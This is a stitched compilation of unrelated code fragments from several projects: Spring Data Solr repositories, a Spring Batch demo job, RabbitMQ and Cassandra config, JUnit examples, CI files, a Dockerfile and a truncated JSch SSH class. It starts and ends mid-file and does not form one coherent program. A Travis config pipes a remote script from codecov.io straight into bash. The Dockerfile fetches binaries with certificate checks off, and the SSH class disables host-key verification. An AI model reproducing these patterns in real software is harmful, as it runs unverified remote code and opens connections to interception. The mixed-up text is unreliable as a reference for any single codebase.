		query.addFilterQuery(new SimpleQuery(new Criteria(IProduct.DOCTYPE_FIELD).is(SolrDocType.PRODUCT)));
		query.setRows(1000);
		Page<Product> results = getSolrOperations().queryForPage(query, Product.class);
		return results.getContent();
	}

	@Override
	public FacetPage<Product> findByFacetOnAvailable(Pageable pageable) {
		FacetQuery query = new SimpleFacetQuery(new
						Criteria(IProduct.DOCTYPE_FIELD).is(SolrDocType.PRODUCT));
		query.setFacetOptions(new FacetOptions(Product.AVAILABLE_FIELD).setFacetLimit(5));
		query.setPageRequest(new PageRequest(0, 100));
		return getSolrOperations().queryForFacetPage(query, Product.class);

	}

	@Override
	public FacetPage<Product> findByFacetOnCategory(Pageable pageable) {

		FacetQuery query = new
				SimpleFacetQuery(new Criteria(IProduct.DOCTYPE_FIELD)
						.is(SolrDocType.PRODUCT));

		query.setFacetOptions(new FacetOptions(Product.CATEGORY_FIELD)
				.setPageable(new PageRequest(0,20)));

		return getSolrOperations().queryForFacetPage(query, Product.class);
	}

}

import com.nixmash.blog.solr.model.IProduct;
import com.nixmash.blog.solr.model.Product;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.geo.Box;
import org.springframework.data.geo.Distance;
import org.springframework.data.geo.Point;
import org.springframework.data.solr.core.query.Query.Operator;
import org.springframework.data.solr.core.query.result.FacetPage;
import org.springframework.data.solr.core.query.result.HighlightPage;
import org.springframework.data.solr.repository.Facet;
import org.springframework.data.solr.repository.Highlight;
import org.springframework.data.solr.repository.Query;
import org.springframework.data.solr.repository.SolrCrudRepository;

import java.util.Collection;
import java.util.List;


public interface CustomProductRepository extends CustomBaseProductRepository, SolrCrudRepository<Product, String> {

	Page<Product> findByPopularityGreaterThanEqual(Integer popularity, Pageable page);

	@Query("name:*?0* AND doctype:product")
	List<Product> findByNameStartingWith(String name);

	List<Product> findByAvailableTrue();

	List<Product> findByAvailableTrueAndDoctype(String docType);

	@Query(IProduct.AVAILABLE_FIELD + ":false")
	Page<Product> findByAvailableFalseUsingAnnotatedQuery(Pageable page);

	public List<Product> findByNameContainsOrCategoriesContains(String title, String category, Sort sort);

	@Query(name = "Product.findByNameOrCategory")
	public List<Product> findByNameOrCategory(String searchTerm, Sort sort);

	@Query("cat:*?0* AND doctype:product")
	public List<Product> findByCategory(String category);

	@Query("(name:*?0* OR cat:*?0*) AND doctype:product")
	public List<Product> findByAnnotatedQuery(String searchTerm, Sort sort);

	@Query("inStock:true AND doctype:product")
	public List<Product> findAvailableProducts();

	@Query("doctype:product")
	public List<Product> findAllProducts();

	@Query("doctype:product")
	public Page<Product> findAllProductsPaged(Pageable page);
	
	@Query(value = "*:*", filters = { "doctype:product" })
	@Facet(fields = IProduct.CATEGORY_FIELD, limit = 6)
	public FacetPage<Product> findProductCategoryFacets(Pageable page);

	@Query("doctype:product")
	@Facet(fields = IProduct.NAME_FIELD, limit = 100)
	public FacetPage<Product> findByNameStartingWith(Collection<String> nameFragments, Pageable pageable);

	public List<Product> findByLocationWithin(Point location, Distance distance);
	
	public List<Product> findByLocationNear(Point location, Distance distance);
	
	public List<Product> findByLocationNear(Box bbox);
	
	@Query("{!geofilt pt=?0 sfield=store d=?1}")
	public List<Product> findByLocationSomewhereNear(Point location, Distance distance);
	
	@Highlight(prefix = "<b>", postfix = "</b>")
	@Query(fields = { IProduct.ID_FIELD, IProduct.NAME_FIELD,
			IProduct.FEATURE_FIELD, IProduct.CATEGORY_FIELD , IProduct.POPULARITY_FIELD, IProduct.LOCATION_FIELD}, defaultOperator = Operator.AND)
	public HighlightPage<Product> findByNameIn(Collection<String> names, Pageable page);

}

import com.nixmash.blog.solr.enums.SolrDocType;
import com.nixmash.blog.solr.model.IProduct;
import com.nixmash.blog.solr.model.Product;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Sort;
import org.springframework.data.solr.core.SolrTemplate;
import org.springframework.data.solr.core.query.*;
import org.springframework.data.solr.core.query.result.HighlightPage;
import org.springframework.stereotype.Repository;

import javax.annotation.Resource;
import java.util.List;

@Repository
public class CustomProductRepositoryImpl implements CustomBaseProductRepository {

	private static final Logger logger = LoggerFactory.getLogger(CustomBaseProductRepository.class);

	@Resource
	private SolrTemplate solrTemplate;

	@Override
	public Page<Product> findTestCategoryRecords() {
		return solrTemplate.queryForPage(
				new SimpleQuery(new SimpleStringCriteria("cat:test")).setPageRequest(new PageRequest(0, 100)),
				Product.class);
	}

	@Override
	public List<Product> findProductsBySimpleQuery(String userQuery) {

		Query query = new SimpleQuery(userQuery);
		query.addFilterQuery(new SimpleQuery(new Criteria(IProduct.DOCTYPE_FIELD).is(SolrDocType.PRODUCT)));
		query.setRows(1000);

		Page<Product> results = solrTemplate.queryForPage(query, Product.class);
		return results.getContent();
	}

	@Override
	public void updateProductCategory(String productId, List<String> categories) {
		PartialUpdate update = new PartialUpdate(IProduct.ID_FIELD, productId);
		update.setValueOfField(IProduct.CATEGORY_FIELD, categories);
		solrTemplate.saveBean(update);
		solrTemplate.commit();
	}

	@Override
	public void updateProductName(Product product) {
		logger.debug("Performing partial update for todo entry: {}", product);
		PartialUpdate update = new PartialUpdate(Product.ID_FIELD, product.getId());
		update.add(Product.NAME_FIELD, product.getName());
		solrTemplate.saveBean(update);
		solrTemplate.commit();
	}

	@Override
	public List<Product> searchWithCriteria(String searchTerm) {
		logger.debug("Building a product criteria query with search term: {}", searchTerm);

		String[] words = searchTerm.split(" ");

		Criteria conditions = createSearchConditions(words);
		SimpleQuery search = new SimpleQuery(conditions);
		search.addSort(sortByIdDesc());

		Page<Product> results = solrTemplate.queryForPage(search, Product.class);
		return results.getContent();
	}

	@Override
	public HighlightPage<Product> searchProductsWithHighlights(String searchTerm) {
		SimpleHighlightQuery query = new SimpleHighlightQuery();
		String[] words = searchTerm.split(" ");
		Criteria conditions = createHighlightedNameConditions(words);
		query.addCriteria(conditions);

		HighlightOptions hlOptions = new HighlightOptions();
		hlOptions.addField("name");
		hlOptions.setSimplePrefix("<b>");
		hlOptions.setSimplePostfix("</b>");
		query.setHighlightOptions(hlOptions);

		return solrTemplate.queryForHighlightPage(query, Product.class);
	}

	private Criteria createHighlightedNameConditions(String[] words) {
		Criteria conditions = null;

		for (String word : words) {
			if (conditions == null) {
				conditions = new Criteria(Product.NAME_FIELD).contains(word);
			} else {
				conditions = conditions.or(new Criteria(Product.NAME_FIELD).contains(word));
			}
		}

		return conditions;
	}

	private Criteria createSearchConditions(String[] words) {
		Criteria conditions = null;

		for (String word : words) {
			if (conditions == null) {
				conditions = new Criteria(Product.NAME_FIELD).contains(word)
						.or(new Criteria(Product.CATEGORY_FIELD).contains(word));
			} else {
				conditions = conditions.or(new Criteria(Product.NAME_FIELD).contains(word))
						.or(new Criteria(Product.CATEGORY_FIELD).contains(word));
			}
		}

		return conditions;
	}

	public Sort sortByIdDesc() {
		return new Sort(Sort.Direction.DESC, Product.ID_FIELD);
	}
}

import com.nixmash.blog.solr.model.PostDoc;
import org.springframework.data.solr.UncategorizedSolrException;
import org.springframework.data.solr.repository.Query;
import org.springframework.data.solr.repository.SolrCrudRepository;

import java.util.List;

public interface CustomPostDocRepository extends CustomBasePostDocRepository, SolrCrudRepository<PostDoc, String> {

    @Query("doctype:post")
    List<PostDoc> findAllPostDocuments();

    @Query("doctype:post AND id:?0")
    PostDoc findPostDocByPostId(long postId);

    @Query(value = "id:?0", requestHandler = "/mlt", filters = { "posttype:POST" })
    List<PostDoc> findMoreLikeThis(long postId) throws UncategorizedSolrException;

}

import org.springframework.cache.annotation.CacheEvict;
import org.springframework.cache.annotation.Caching;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;

import static java.lang.annotation.RetentionPolicy.RUNTIME;

/**
 * Created by daveburke on 10/25/16.
 */
@SuppressWarnings({"SpringElInspection", "ELValidationInJSP"})
@Caching(

        evict = {
                @CacheEvict(cacheNames= "posts", key = "#result.postId"),
                @CacheEvict(cacheNames= "posts", key = "#result.postName"),
                @CacheEvict(cacheNames= "pagedPosts",
                        allEntries = true,
                        beforeInvocation = true)
        }
)
@Target({ElementType.METHOD})
@Retention(RUNTIME)
public @interface CachePostUpdate {
}



import com.nixmash.blog.jpa.dto.PostDTO;
import com.nixmash.blog.jpa.model.Post;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.batch.core.*;
import org.springframework.batch.core.configuration.annotation.JobBuilderFactory;
import org.springframework.batch.core.configuration.annotation.StepBuilderFactory;
import org.springframework.batch.core.job.flow.FlowExecutionStatus;
import org.springframework.batch.core.job.flow.JobExecutionDecider;
import org.springframework.batch.core.launch.support.RunIdIncrementer;
import org.springframework.batch.core.listener.ExecutionContextPromotionListener;
import org.springframework.batch.core.scope.context.ChunkContext;
import org.springframework.batch.core.step.tasklet.Tasklet;
import org.springframework.batch.item.ItemWriter;
import org.springframework.batch.item.database.JpaPagingItemReader;
import org.springframework.batch.item.file.FlatFileItemWriter;
import org.springframework.batch.item.file.transform.BeanWrapperFieldExtractor;
import org.springframework.batch.item.file.transform.DelimitedLineAggregator;
import org.springframework.batch.repeat.RepeatStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.FileSystemResource;

import javax.persistence.EntityManagerFactory;

@SuppressWarnings("Convert2Lambda")
@Configuration
public class DemoJobConfiguration {

    private static final Logger logger = LoggerFactory.getLogger(DemoJobConfiguration.class);

    private static final FlowExecutionStatus YES = new FlowExecutionStatus("YES");
    private static final FlowExecutionStatus NO = new FlowExecutionStatus("NO");

    private final JobBuilderFactory jobBuilderFactory;
    private final StepBuilderFactory stepBuilderFactory;
    private final EntityManagerFactory entityManagerFactory;
    private final DemoJobListener demoJobListener;
    private final DemoJobStepListener demoJobStepListener;

    @Autowired
    public DemoJobConfiguration(EntityManagerFactory entityManagerFactory, DemoJobListener demoJobListener, DemoJobStepListener demoJobStepListener, StepBuilderFactory stepBuilderFactory, JobBuilderFactory jobBuilderFactory) {
        this.entityManagerFactory = entityManagerFactory;
        this.demoJobListener = demoJobListener;
        this.demoJobStepListener = demoJobStepListener;
        this.stepBuilderFactory = stepBuilderFactory;
        this.jobBuilderFactory = jobBuilderFactory;
    }

    private String c(FlowExecutionStatus executionStatus) {
        return executionStatus.getName();
    }

    @Bean
    public JpaPagingItemReader<Post> demoJobReader() throws Exception {
        String jpqlQuery = "SELECT p from Post p";

        JpaPagingItemReader<Post> reader = new JpaPagingItemReader<>();
        reader.setQueryString(jpqlQuery);
        reader.setEntityManagerFactory(entityManagerFactory);
        reader.setPageSize(1000);
        reader.afterPropertiesSet();
        reader.setSaveState(true);

        return reader;
    }

    @Bean
    public DemoJobItemProcessor demoJobProcessor() {
        return new DemoJobItemProcessor();
    }

    @Bean
    public ItemWriter<PostDTO> demoJobWriter() {
        FlatFileItemWriter<PostDTO> writer = new FlatFileItemWriter<>();
        writer.setResource(new FileSystemResource("/home/daveburke/web/nixmashspring/posts.csv"));
        DelimitedLineAggregator<PostDTO> delLineAgg = new DelimitedLineAggregator<>();
        delLineAgg.setDelimiter(";");
        BeanWrapperFieldExtractor<PostDTO> fieldExtractor = new BeanWrapperFieldExtractor<>();
        fieldExtractor.setNames(new String[]{"postTitle"});
        delLineAgg.setFieldExtractor(fieldExtractor);
        writer.setLineAggregator(delLineAgg);
        return writer;
    }

    @Bean(name = "demoJob")
    public Job demoJob() throws Exception {
        return jobBuilderFactory.get("demoJob")
                .incrementer(new RunIdIncrementer())
                .listener(demoJobListener)
                .flow(demoStep1())
                .next(decideIfGoodToContinue())
                .on(c(NO))
                .end()
                .on(c(YES))
                .to(optionalStep())
                .end()
                .build();
    }

    @Bean
    public Step demoStep1() throws Exception {
        return stepBuilderFactory.get("demoStep1")
                .<Post, PostDTO>chunk(100)
                .reader(demoJobReader())
                .processor(demoJobProcessor())
                .writer(demoJobWriter())
                .listener(demoPromotionListener())
                .listener(demoJobStepListener)
                .allowStartIfComplete(true)
                .build();
    }

    @Bean
    public JobExecutionDecider decideIfGoodToContinue() {
        return new JobExecutionDecider() {

            int iteration = 0;

            @Override
            public FlowExecutionStatus decide(JobExecution jobExecution, StepExecution stepExecution) {
                long postId = 0;
                try {
                    postId = jobExecution.getExecutionContext().getLong("postId");
                } catch (Exception e) {
                    logger.info("FlowExecution Exception: " + e.getMessage());
                }

                long iterations = jobExecution.getJobParameters().getLong("iterations");
                if(iteration < iterations) {
                    logger.info("ITERATING... POSTID = " + postId);
                    iteration++;
                    return YES;
                } else {
                    logger.info("REPEATED 2X's. SKIPPING OPTIONAL STEP");
                    return NO;
                }
            }
        };
    }

    @Bean
    public Step optionalStep() {
        return stepBuilderFactory.get("optionalStep")
                .tasklet(new Tasklet() {
                    @Override
                    public RepeatStatus execute(StepContribution contribution,
                                                ChunkContext chunkContext) throws Exception {
                        logger.info("IN OPTIONAL STEP ------------------------ */");
                        return RepeatStatus.FINISHED;
                    }
                })
                .build();
    }

    @Bean
    public ExecutionContextPromotionListener demoPromotionListener()
    {
        ExecutionContextPromotionListener listener =
                                                                                    new ExecutionContextPromotionListener();
        listener.setKeys( new String[] { "postId" } );
        return listener;
    }

import org.springframework.amqp.core.*;
import org.springframework.amqp.rabbit.annotation.EnableRabbit;
import org.springframework.amqp.rabbit.connection.CachingConnectionFactory;
import org.springframework.amqp.rabbit.connection.ConnectionFactory;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer;
import org.springframework.amqp.rabbit.listener.adapter.MessageListenerAdapter;
import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;
import org.springframework.amqp.support.converter.MessageConverter;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.beans.factory.config.ConfigurableBeanFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Scope;
import org.springframework.web.filter.CharacterEncodingFilter;

@EnableRabbit
@Configuration
public class AmqpConfig {
    public static final String EXCHANGE = "spring.boot.direct";
    public static final String ROUTINGKEY_FAIL = "spring.boot.routingKey.failure";
    public static final String ROUTINGKEY = "spring.boot.routingKey";
    public static final String QUEUE_NAME = "spring.demo";
    public static final String QUEUE_NAME_FAIL = "spring.demo.failure";

    //RabbitMQ的配置信息
    @Value("${spring.rabbitmq.host}")
    private String host;
    @Value("${spring.rabbitmq.port}")
    private Integer port;
    @Value("${spring.rabbitmq.username}")
    private String username;
    @Value("${spring.rabbitmq.password}")
    private String password;
    @Value("${spring.rabbitmq.virtual-host}")
    private String virtualHost;


    //建立一个连接容器，类型数据库的连接池
    @Bean
    public ConnectionFactory connectionFactory() {
        CachingConnectionFactory connectionFactory =
                new CachingConnectionFactory(host, port);
        connectionFactory.setUsername(username);
        connectionFactory.setPassword(password);
        connectionFactory.setVirtualHost(virtualHost);
        connectionFactory.setPublisherConfirms(true);// 确认机制
        //发布确认，template要求CachingConnectionFactory的publisherConfirms属性设置为true
        return connectionFactory;
    }

    // RabbitMQ的使用入口
    @Bean
    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)
    //必须是prototype类型
    public RabbitTemplate rabbitTemplate() {
        RabbitTemplate template = new RabbitTemplate(this.connectionFactory());
        template.setMessageConverter(this.jsonMessageConverter());
        template.setMandatory(true);
        return template;
    }

    /**
     * 交换机
     * 针对消费者配置
     * FanoutExchange: 将消息分发到所有的绑定队列，无routingkey的概念
     * HeadersExchange ：通过添加属性key-value匹配
     * DirectExchange:按照routingkey分发到指定队列
     * TopicExchange:多关键字匹配
     */
    @Bean
    public DirectExchange exchange() {
        return new DirectExchange(EXCHANGE);
    }

    /**
     * 队列
     *
     * @return
     */
    @Bean
    public Queue queue() {
        return new Queue(QUEUE_NAME, true); //队列持久

    }

    @Bean
    public Queue queueFail() {
        return new Queue(QUEUE_NAME_FAIL, true); //队列持久

    }
    /**
     * 绑定
     *
     * @return
     */
    @Bean
    public Binding binding(Queue queue, DirectExchange exchange) {
        return BindingBuilder.bind(queue()).to(exchange()).with(AmqpConfig.ROUTINGKEY);
    }

    @Bean
    public Binding bindingFail(Queue queue, DirectExchange exchange) {
        return BindingBuilder.bind(queueFail()).to(exchange()).with(AmqpConfig.ROUTINGKEY_FAIL);
    }
    @Bean
    public MessageConverter jsonMessageConverter() {
        return new Jackson2JsonMessageConverter();
    }

    /**
     * 声明一个监听容器
     *
     * @return
     */
//    @Bean(name="rabbitListenerContainer")
//    public SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory() {
//        SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();
//        factory.setMessageConverter(jsonMessageConverter());
//        factory.setConnectionFactory(connectionFactory());
//        factory.setAcknowledgeMode(AcknowledgeMode.MANUAL);//设置消费者手动应答
//        factory.setPrefetchCount(1);//从代理接收消息的数目。这个值越大，发送消息就越快，但是导致非顺序处理的风险就越高
//
//        return factory;
//    }

    @Bean
    Receiver receiver(){
        return new Receiver();
    }

    @Bean
    MessageListenerAdapter listenerAdapter(Receiver receiver) {
        return new MessageListenerAdapter(receiver, "onMessage");
    }

    @Bean
    public SimpleMessageListenerContainer messageListenerContainer(MessageListenerAdapter listenerAdapter) {
        SimpleMessageListenerContainer container = new SimpleMessageListenerContainer();
        container.setConnectionFactory(connectionFactory());
        container.setQueueNames(AmqpConfig.QUEUE_NAME);
        container.setExposeListenerChannel(true);
        container.setMaxConcurrentConsumers(1);
        container.setConcurrentConsumers(1);
        container.setAcknowledgeMode(AcknowledgeMode.MANUAL); //设置确认模式手工确认
        container.setMessageListener(listenerAdapter);
        return container;
    }



    @Bean
    public CharacterEncodingFilter characterEncodingFilter() {
        CharacterEncodingFilter filter = new CharacterEncodingFilter();
        filter.setEncoding("UTF-8");
        filter.setForceEncoding(true);
        return filter;
    }

}


import java.io.Serializable;
import java.lang.reflect.Type;
import java.time.Duration;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeParseException;
import java.util.HashMap;
import java.util.Map;

import org.eclipse.microprofile.config.spi.Converter;

/**
 * @author <a href="http://jmesnil.net/">Jeff Mesnil</a> (c) 2017 Red Hat inc.
 */
class Converters {

    static final Converter<String> STRING_CONVERTER = (Converter & Serializable) value -> value;

    static final Converter<Boolean> BOOLEAN_CONVERTER = (Converter & Serializable) value -> {
        if (value != null) {
            return "TRUE".equalsIgnoreCase(value)
                    || "1".equalsIgnoreCase(value)
                    || "YES".equalsIgnoreCase(value)
                    || "Y".equalsIgnoreCase(value)
                    || "ON".equalsIgnoreCase(value)
                    || "JA".equalsIgnoreCase(value)
                    || "J".equalsIgnoreCase(value)
                    || "OUI".equalsIgnoreCase(value);
        }
        return null;
    };

    static final Converter<Double> DOUBLE_CONVERTER = (Converter & Serializable) value -> value != null ? Double.valueOf(value) : null;

    static final Converter<Float> FLOAT_CONVERTER = (Converter & Serializable) value -> value != null ? Float.valueOf(value) : null;

    static final Converter<Long> LONG_CONVERTER = (Converter & Serializable) value -> value != null ? Long.valueOf(value) : null;

    static final Converter<Integer> INTEGER_CONVERTER = (Converter & Serializable) value -> value != null ? Integer.valueOf(value) : null;

    static final Converter<Duration> DURATION_CONVERTER = (Converter & Serializable) value -> {
        try {
            return value != null ? Duration.parse(value) : null;
        } catch (DateTimeParseException e) {
            throw new IllegalArgumentException(e);
        }
    };

    static final Converter<LocalDate> LOCAL_DATE_CONVERTER = (Converter & Serializable) value -> {
        try {
            return value != null ? LocalDate.parse(value) : null;
        } catch (DateTimeParseException e) {
            throw new IllegalArgumentException(e);
        }
    };

    static final Converter<LocalTime> LOCAL_TIME_CONVERTER = (Converter & Serializable) value -> {
        try {
            return value != null ? LocalTime.parse(value) : null;
        } catch (DateTimeParseException e) {
            throw new IllegalArgumentException(e);
        }
    };

    static final Converter<LocalDateTime> LOCAL_DATE_TIME_CONVERTER = (Converter & Serializable) value -> {
        try {
            return value != null ? LocalDateTime.parse(value) : null;
        } catch (DateTimeParseException e) {
            throw new IllegalArgumentException(e);
        }
    };

    public static final Map<Type, Converter> ALL_CONVERTERS = new HashMap<>();

    static {
        ALL_CONVERTERS.put(String.class, STRING_CONVERTER);

        ALL_CONVERTERS.put(Boolean.class, BOOLEAN_CONVERTER);
        ALL_CONVERTERS.put(Boolean.TYPE, BOOLEAN_CONVERTER);

        ALL_CONVERTERS.put(Double.class, DOUBLE_CONVERTER);
        ALL_CONVERTERS.put(Double.TYPE, DOUBLE_CONVERTER);

        ALL_CONVERTERS.put(Float.class, FLOAT_CONVERTER);
        ALL_CONVERTERS.put(Float.TYPE, FLOAT_CONVERTER);

        ALL_CONVERTERS.put(Long.class, LONG_CONVERTER);
        ALL_CONVERTERS.put(Long.TYPE, LONG_CONVERTER);

        ALL_CONVERTERS.put(Integer.class, INTEGER_CONVERTER);
        ALL_CONVERTERS.put(Integer.TYPE, INTEGER_CONVERTER);

        ALL_CONVERTERS.put(Duration.class, DURATION_CONVERTER);

        ALL_CONVERTERS.put(LocalDate.class, LOCAL_DATE_CONVERTER);

        ALL_CONVERTERS.put(LocalTime.class, LOCAL_TIME_CONVERTER);

        ALL_CONVERTERS.put(LocalDateTime.class, LOCAL_DATE_TIME_CONVERTER);
    }
}
==============================================================================================================
import org.springframework.boot.autoconfigure.cache.CacheType;
import org.springframework.context.annotation.Condition;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.core.type.AnnotatedTypeMetadata;

public class InfinispanEmbeddedCacheManagerChecker implements Condition {
    @Override
    public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
        String cacheType = context.getEnvironment().getProperty("spring.cache.type");

        return cacheType == null || CacheType.INFINISPAN.name().equalsIgnoreCase(cacheType);
    }
}
==============================================================================================================
	static String render(Map<Option, Object> valueMap) {

		if (valueMap.isEmpty()) {
			return "";
		}

		StringBuilder cql = new StringBuilder(valueMap.size() * 2 * 16);
		// else option value is a non-empty map

		// append { 'name' : 'value', ... }
		cql.append("{ ");
		boolean mapFirst = true;
		for (Map.Entry<Option, Object> entry : valueMap.entrySet()) {
			if (mapFirst) {
				mapFirst = false;
			} else {
				cql.append(", ");
			}

			Option option = entry.getKey();
			cql.append(singleQuote(option.getName())); // entries in map keys are always quoted
			cql.append(" : ");
			Object entryValue = entry.getValue();
			entryValue = entryValue == null ? "" : entryValue.toString();
			if (option.escapesValue()) {
				entryValue = escapeSingle(entryValue);
			}
			if (option.quotesValue()) {
				entryValue = singleQuote(entryValue);
			}
			cql.append(entryValue);
		}
		cql.append(" }");

		return cql.toString();
	}
	
	  @Bean
  public CassandraEntityInformation information(CassandraOperations cassandraTemplate) {
    CassandraPersistentEntity<Person> entity =
        (CassandraPersistentEntity<Person>)
            cassandraTemplate
                .getConverter()
                .getMappingContext()
                .getRequiredPersistentEntity(Person.class);
    return new MappingCassandraEntityInformation<>(entity, cassandraTemplate.getConverter());
  }
==============================================================================================================
	/**
	 * Where clause builder. Collects {@link Clause clauses} and builds the where-clause depending on the WHERE type.
	 *
	 * @author Mark Paluch
	 */
	static class QueryBuilder {

		private List<CriteriaDefinition> criterias = new ArrayList<>();

		CriteriaDefinition and(CriteriaDefinition clause) {
			criterias.add(clause);
			return clause;
		}

		Query create(Sort sort) {

			Query query = Query.query(criterias);

			return query.sort(sort);
		}
	}
==============================================================================================================
language: go
go:
  - 1.12
script:
  - env GO111MODULE=on make lint
  - env GO111MODULE=on go test -race -coverprofile=coverage.txt -covermode=atomic $(go list ./...)
after_success:
  - bash <(curl -s https://codecov.io/bash)
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
 
import static org.junit.jupiter.api.Assertions.assertNotNull;
 
@DisplayName("Pass the method parameters provided by the @ValueSource annotation")
class ValueSourceExampleTest {
 
    @DisplayName("Should pass a non-null message to our test method")
    @ParameterizedTest(name = "{index} => message=''{0}''")
    @ValueSource(strings = {"Hello", "World"})
    void shouldPassNonNullMessageAsMethodParameter(String message) {
        assertNotNull(message);
    }
}

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
 
import static org.junit.jupiter.api.Assertions.assertNotNull;
 
@DisplayName("Pass enum values to our test method")
class EnumSourceExampleTest {
 
    @DisplayName("Should pass non-null enum values as method parameters")
    @ParameterizedTest(name = "{index} => pet=''{0}''")
    @EnumSource(Pet.class)
    void shouldPassNonNullEnumValuesAsMethodParameter(Pet pet) {
        assertNotNull(pet);
    }
}

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
 
import static org.junit.jupiter.api.Assertions.assertEquals;
 
@DisplayName("Should pass the method parameters provided by the @CsvSource annotation")
class CsvSourceExampleTest {
 
    @DisplayName("Should calculate the correct sum")
    @ParameterizedTest(name = "{index} => a={0}, b={1}, sum={2}")
    @CsvSource({
            "1, 1, 2",
            "2, 3, 5"
    })
    void sum(int a, int b, int sum) {
        assertEquals(sum, a + b);
    }
}import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
 
import java.util.stream.Stream;
 
import static org.junit.jupiter.api.Assertions.assertEquals;
 
@DisplayName("Should pass the method parameters provided by the sumProvider() method")
class MethodSourceExampleTest {
 
    @DisplayName("Should calculate the correct sum")
    @ParameterizedTest(name = "{index} => a={0}, b={1}, sum={2}")
    void sum(int a, int b, int sum) {
        assertEquals(sum, a + b);
    }
 
    private static Stream<Arguments> sumProvider() {
        return Stream.of(
                Arguments.of(1, 1, 2),
                Arguments.of(2, 3, 5)
        );
    }
}


==============================================================================================================
stages:
- dependency_scanning
- maven-build
- sonar
- maven-deploy
- publish-doc

cache:
    paths:
      - .m2/

variables:
  MAVEN_OPTS: "-Dmaven.repo.local=.m2"

maven-build:
  image: maven:3-jdk-8
  stage: maven-build
  script: "mvn clean verify javadoc:javadoc -B"
  artifacts:
    paths:
      - target/
 
dependency_scanning:
  image: docker:stable
  stage: dependency_scanning
  variables:
    DOCKER_DRIVER: overlay2
  allow_failure: true
  services:
    - docker:stable-dind
  script:
    - export SP_VERSION=$(echo "$CI_SERVER_VERSION" | sed 's/^\([0-9]*\)\.\([0-9]*\).*/\1-\2-stable/')
    - docker run
        --env DEP_SCAN_DISABLE_REMOTE_CHECKS="${DEP_SCAN_DISABLE_REMOTE_CHECKS:-false}"
        --volume "$PWD:/code"
        --volume /var/run/docker.sock:/var/run/docker.sock
        "registry.gitlab.com/gitlab-org/security-products/dependency-scanning:$SP_VERSION" /code
  artifacts:
    paths: [gl-dependency-scanning-report.json]
    
pages:
  image: maven:3-jdk-8
  stage: publish-doc
  script:
    - mkdir public
    - cp -r target/site/apidocs/* public/
  artifacts:
    paths:
    - public
  only:
    - master

ossrh-staging:
 stage: maven-deploy
 image: maven:3-jdk-8
 except:
  - features/ossrh
 variables:
  GPG_TTY: "`tty`"
 script:
  - echo "$GPG_PRIVATE_KEY" | gpg --batch --import --passphrase "$GPG_PASSPHRASE" -
  - mvn deploy -s settings.xml
 only:
  - master

sonar:
  image: maven:3-jdk-8
  stage: sonar
  script: "mvn sonar:sonar -s settings.xml"

==============================================================================================================
# To build docker build -t sonar-scanner .
FROM openjdk:11.0.1-jre

LABEL maintainer="Jérôme TAMA <j.tama@groupeonepoint.com>"

WORKDIR /data

RUN curl --insecure -o ./node-v11.6.0-linux-x64.tar.xz -L https://nodejs.org/dist/v11.6.0/node-v11.6.0-linux-x64.tar.xz \
	&& mkdir /usr/local/lib/nodejs \
	&& tar -xJvf node-v11.6.0-linux-x64.tar.xz -C /usr/local/lib/nodejs \ 
	&& mv /usr/local/lib/nodejs/node-v11.6.0-linux-x64 /usr/local/lib/nodejs/node-v11.6.0 \
	&& rm node-v11.6.0-linux-x64.tar.xz \
	&& chmod -R a+x /usr/local/lib/nodejs/node-v11.6.0 \
	&& curl --insecure -o ./sonarscanner.zip -L https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip \
	&& unzip sonarscanner.zip \
	&& rm sonarscanner.zip \
	&& mv sonar-scanner-3.2.0.1227-linux /usr/local/lib/sonar-scanner

ENV SONAR_RUNNER_HOME=/usr/local/lib/sonar-scanner
ENV PATH $PATH:/usr/local/lib/sonar-scanner/bin:/usr/local/lib/nodejs/node-v11.6.0/bin
ENV NODEJS_HOME /usr/local/lib/nodejs/node-v11.6.0/bin

CMD sonar-scanner

==============================================================================================================
import com.jcraft.jsch.*;
import fr.onepoint.universaltester.UniversalTesterException;
import org.apache.commons.io.FilenameUtils;
import org.apache.commons.io.IOUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static java.text.MessageFormat.format;

public class CloseableSSH implements Closeable, SSH {

    private static final Logger LOGGER = LoggerFactory.getLogger(SSH.class);

    private final Session session;

    public CloseableSSH(String host, String user, String password, int port) {
        LOGGER.debug("Creating new SSH connection to {}@{}:{}", user, host, port);
        JSch jsch = new JSch();
        try {
            session = jsch.getSession(user, host, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            session.connect(30000);
        } catch (JSchException e) {
            throw new UniversalTesterException(e);
        }

    }

    @Override
    public String exec(String command) {
        LOGGER.debug("Executing command {} to {}", command, session.getHost());
